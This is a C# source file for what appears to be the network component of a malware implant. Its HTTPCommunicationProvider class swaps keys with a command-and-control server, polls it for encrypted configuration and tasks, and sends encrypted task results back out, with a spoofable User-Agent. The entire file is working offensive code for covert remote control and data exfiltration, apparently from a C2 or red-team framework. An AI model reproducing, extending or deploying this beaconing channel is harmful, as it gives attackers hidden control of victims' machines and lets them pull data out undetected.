using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text.Json;

namespace Implant
{
    class HTTPCommunicationProvider: CommunicationProviderInterface
    {
        private string c2Url;

        private string name;

        private CryptoProvider cryptoProvider;

        private HttpClient client;
        public HTTPCommunicationProvider(string c2Url, string name, string userAgent)
        {
            this.c2Url = c2Url;
            this.name = name;
            this.cryptoProvider = new CryptoProvider();
            this.client = new HttpClient();
            this.client.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);
        }

        public void keyExchangeSetup()
        {
            //string body = "{\"name\":\"__name__\",\"publicKey\": \"__keyContent__\"}".Replace("__keyContent__", Base64Encode(cryptoProvider.getPublicKey())).Replace("__name__",this.name);
            string body = buildJsonMessage(Base64Encode(cryptoProvider.getPublicKey()));

            var response = client.PostAsync(this.c2Url + "/keyExchange", new StringContent(body, Encoding.UTF8, "application/json")).Result;

            var aesKey = cryptoProvider.decryptRSAMessage(response.Content.ReadAsStringAsync().Result);
            cryptoProvider.setAesKey(aesKey);
        }

        public string sendEncryptedRequest(string body, string endpoint)
        {
            string encryptedBody = cryptoProvider.encryptAesMessage(body);
            string jsonBody = buildJsonMessage(encryptedBody);
            var response = client.PostAsync(this.c2Url + endpoint, new StringContent(jsonBody, Encoding.UTF8, "application/json")).Result;

            var encryptedString = response.Content.ReadAsStringAsync().Result;
            var decrypted = cryptoProvider.decryptAesMessage(encryptedString);

            return decrypted;
        }


        public Config getConfig() {
            var response = client.GetAsync(this.c2Url + "/getConfig/" + this.name).Result;

            var encryptedString = response.Content.ReadAsStringAsync().Result;
            var decrypted = cryptoProvider.decryptAesMessage(encryptedString);
            Config config = JsonSerializer.Deserialize<Config>(decrypted);
            return config;
        }

        public Task getNextTask() {
            var response = client.GetAsync(this.c2Url + "/getNextTask/" +this.name).Result;

            var encryptedString = response.Content.ReadAsStringAsync().Result;
            var decrypted = cryptoProvider.decryptAesMessage(encryptedString);

            return JsonSerializer.Deserialize<Task>(decrypted); ;

        }

        public void updateTaskResult(string UUID, string taskResult){
            var body = new Dictionary<string, string>();
            body.Add("taskId", UUID);
            body.Add("taskResult", taskResult);
            string encryptedBody = cryptoProvider.encryptAesMessage(JsonSerializer.Serialize(body));
            string jsonBody = buildJsonMessage(encryptedBody);
            var response = client.PostAsync(this.c2Url + "/updateTaskResult", new StringContent(jsonBody, Encoding.UTF8, "application/json")).Result;

            var encryptedString = response.Content.ReadAsStringAsync().Result;
            var decrypted = cryptoProvider.decryptAesMessage(encryptedString);

        }

        private static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        private static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        private string buildJsonMessage(string message)
        {
            var messageMap = new Dictionary<string, string>()
            {
                { "name", this.name }
            };

            messageMap.Add("payload", message);
            return JsonSerializer.Serialize(messageMap);
        }

    }
}
